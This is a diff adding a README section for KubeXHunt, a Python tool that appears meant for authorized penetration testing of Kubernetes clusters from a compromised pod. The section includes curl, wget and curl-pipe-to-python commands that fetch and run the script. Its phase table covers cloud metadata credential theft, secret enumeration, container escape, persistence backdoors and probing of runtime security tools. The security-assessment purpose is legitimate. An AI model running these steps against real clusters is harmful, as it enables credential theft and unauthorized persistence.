@@ -12,12 +12,159 @@
 
 ---
 
+## 🛠️ KubeXHunt — Automated Assessment Tool
+
+> **Drop this tool onto any compromised pod and run a full automated assessment of the entire cluster.**
+> Zero external dependencies — pure Python 3 stdlib only.
+
+<div align="center">
+
+[![Tool](https://img.shields.io/badge/Tool-KubeXHunt-red?style=for-the-badge&logo=python)](.)
+[![Language](https://img.shields.io/badge/Language-Python%203-blue?style=for-the-badge&logo=python)](.)
+[![Dependencies](https://img.shields.io/badge/Dependencies-None-green?style=for-the-badge)](.)
+[![Author](https://img.shields.io/badge/Author-Mayank%20Choubey-orange?style=for-the-badge)](.)
+
+</div>
+
+### ⬇️ Download & Run
+
+```bash
+# Download on the compromised pod
+curl -sLO https://raw.githubusercontent.com/your-repo/kubexhunt/main/kubexhunt.py
+
+# OR using wget
+wget -q https://raw.githubusercontent.com/your-repo/kubexhunt/main/kubexhunt.py
+
+# OR using Python itself (if curl/wget unavailable)
+python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/your-repo/kubexhunt/main/kubexhunt.py', 'kubexhunt.py')"
+
+# Run full assessment
+python3 kubexhunt.py
+```
+
+---
+
+### 🚀 Usage
+
+```
+python3 kubexhunt.py [OPTIONS]
+
+Options:
+  --phase N [N ...]   Run specific phase(s) only (0-14)
+  --fast              Skip slow checks (port scanning, DNS brute force)
+  --output FILE       Save report to file (.json or .txt)
+  --no-color          Disable colored output (for log files / piping)
+  --kubectl-only      Only install kubectl and exit
+  -h, --help          Show help
+```
+
+**Examples:**
+
+```bash
+# Full assessment (all 15 phases)
+python3 kubexhunt.py
+
+# Only cloud metadata checks (AWS IMDS / GKE metadata)
+python3 kubexhunt.py --phase 2
+
+# RBAC + network lateral movement only
+python3 kubexhunt.py --phase 3 4
+
+# Skip slow DNS brute-force and port scanning
+python3 kubexhunt.py --fast
+
+# Save machine-readable JSON report
+python3 kubexhunt.py --output report.json
+
+# Save plain text report (for log shipping)
+python3 kubexhunt.py --no-color --output report.txt
+
+# Install kubectl only (then run other commands manually)
+python3 kubexhunt.py --kubectl-only
+```
+
+---
+
+### 📋 Phases Covered
+
+| Phase | Name | What It Checks |
+|-------|------|----------------|
+| `0` | Setup & kubectl Install | Auto-installs kubectl, detects cloud (AWS/GKE/Azure), grabs SA token |
+| `1` | Pod & Container Recon | Capabilities (CapEff), seccomp, privileged, hostPID, hostNetwork, runtime socket |
+| `2` | Cloud Metadata & IAM | IMDSv1/v2 credential theft, GKE OAuth token, node SA scopes, IRSA |
+| `3` | K8s API & RBAC | SA permissions, secret enumeration, cluster-wide access, cluster-admin bindings |
+| `4` | Network & Lateral Movement | Service discovery, DNS brute-force, port scan, internal API probe, NET_RAW sniff |
+| `5` | Container Escape | nsenter, chroot, Docker/containerd socket, cgroup v1 release_agent |
+| `6` | Node Compromise | Kubelet certs, other pods' SA tokens, SSH keys, kubeconfig files |
+| `7` | Cluster Escalation | Privileged pod creation, ClusterRoleBinding escalation, webhook failurePolicy |
+| `8` | Persistence | Backdoor SA in kube-system, DaemonSet creation, sidecar injection |
+| `9` | Supply Chain | Image signing webhooks, registry credentials, PSS enforcement, Kyverno policies |
+| `10` | EKS-Specific | aws-auth read/write, IRSA tokens, node IAM role, CloudWatch audit logs |
+| `11` | GKE-Specific | Workload Identity, legacy metadata endpoint, cloud-platform scope, Dashboard |
+| `12` | Runtime Security | Tetragon/Falco detection, TracingPolicy check, enforcement probing |
+| `13` | Secrets & Data | Env var credential scan, mounted secret files, app config credential grep |
+| `14` | DoS & Resource Limits | cgroup memory/CPU limits, ResourceQuota, LimitRange, audit logging |
+
+---
+
+### 📊 Sample Output
+
+```
+╔═══════════════════════════════════════════════════════════════════╗
+║         Kubernetes Security Assessment Tool  v1.0.0              ║
+║         Starting from a Compromised Pod → Full Cluster Audit     ║
+║         Author: Mayank Choubey                                   ║
+╚═══════════════════════════════════════════════════════════════════╝
+
+──────────────────────────────────────────────────────────────
+  PHASE 2 │ Cloud Metadata & IAM
+  AWS IMDS credential theft, GKE metadata, OAuth token exfiltration
+──────────────────────────────────────────────────────────────
+
+  ▸ AWS IMDSv2 Credential Theft
+  🔴 [CRITICAL] AWS IAM credentials stolen via IMDS
+  │          Role: eks-node-group-role | KeyId: ASIA...
+  │          Expires: 2026-03-18T14:30:00Z
+  │ ⚑ Fix:  Block 169.254.169.254/32 via Calico GlobalNetworkPolicy
+
+──────────────────────────────────────────────────────────────
+  KUBEXHUNT — FINAL ASSESSMENT REPORT
+══════════════════════════════════════════════════════════════════
+
+  🔴 CRITICAL :    3
+  🟠 HIGH     :    7
+  🟡 MEDIUM   :    4
+  🔵 LOW      :    2
+  ✅ PASS     :   18
+  ─────────────────────────────────────────
+  Total Issues:   16
+
+  Overall Risk: 🔴 CRITICAL RISK — Immediate action required
+```
+
+---
+
+### ⚡ Quick One-Liner (no file save)
+
+```bash
+# Run directly in memory — nothing written to disk
+curl -s https://raw.githubusercontent.com/your-repo/kubexhunt/main/kubexhunt.py | python3 - --fast
+```
+
+> [!NOTE]
+> KubeXHunt installs `kubectl` automatically on the pod if it is not already present.
+> All checks are **read-only** by default — creation tests (pods, bindings) are immediately
+> cleaned up after proving permissions. The tool never modifies workloads or RBAC permanently.
+---
+
 > [!IMPORTANT]
 > **Starting Point:** You have Remote Code Execution (RCE) inside a compromised pod.
 > All commands are executed **from inside that pod** unless stated otherwise.
 > **Philosophy:** Demonstrate impact without destroying — read, enumerate, prove, document.
 
 ---
+
+## What Actually Happening and Checklist for Each Test Case
 
 ## 📋 Table of Contents
 
